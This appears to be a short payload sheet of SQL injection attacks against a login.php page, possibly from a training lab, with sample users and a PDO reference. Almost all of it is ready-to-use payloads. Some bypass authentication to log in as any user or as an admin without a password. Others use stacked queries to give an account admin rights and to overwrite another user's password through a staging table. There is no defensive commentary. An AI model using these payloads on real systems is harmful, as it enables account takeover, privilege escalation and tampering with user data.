#Attack #1 : access user account without knowing the password
Target: login.php page.

# access random account, it accesses the first account in the database based on its ID
' or 1=1 -- 

# access any account without password
bob@gmail.com' -- 
' or email='bob@gmail.com' -- 

# Bypass code logic : access an admin account without password or username
' or (role='admin') -- 


## Attack #2: Privileges escalation
Target: login.php page.

# An attacker can create an account and use the following payload to become an admin
'; update users set role='admin' where email='alex@gmail.com' -- 

# Change user password to attacker chosen password
'; update users u1 set u1.password=(select u2.password from users u2 where u2.email='alex@gmail.com') where u1.email='alice@gmail.com' -- 

## but subqureries in the same table are not supported in Mysql
## Therefore, it is possibile to do it this way
'; insert into items (name, price, quantity) values ('0',1234,0) -- 
'; update items i set i.name=(select u.password from users u where u.email='alex@gmail.com') where i.price = 1234 -- 
'; update users u set u.password=(select i.name from items i where i.price=1234) where u.email = 'alice@gmail.com' -- 
'; delete from items where price = 1234 -- 


Reference:
Database query PDO
(write.corbpie.com) https://write.corbpie.com/php-pdo-mysql-cheat-sheet-guide/